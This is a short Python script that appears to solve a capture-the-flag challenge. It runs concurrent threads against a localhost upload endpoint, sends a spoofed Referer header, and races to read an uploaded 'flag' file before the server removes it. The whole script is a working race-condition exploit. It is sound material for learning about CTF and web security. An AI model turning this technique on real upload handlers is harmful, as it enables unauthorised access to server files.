import threading
import requests

uplurl = 'http://localhost/ctf/uploadsomething.php?filename=flag&content=1'
resurl = 'http://localhost/ctf/uploads/363baea9cba210afac6d7a556fca596e30c46333/flag'

class Access(threading.Thread):
    def __init__(self, number, url):
        threading.Thread.__init__(self)
        self.number = number
        self.url = url
    def run(self):
        if 'uploadsomething' in self.url:
            for i in range(self.number):
                requests.get(self.url, headers={'Referer':'Anything'})
        else:
            for i in range(self.number):
                result = str(requests.get(self.url).content).replace('b', '')+'\n'
                print(result)

up = Access(3, uplurl)
re = Access(3, resurl)

up.start()
re.start()

up.join()
re.join()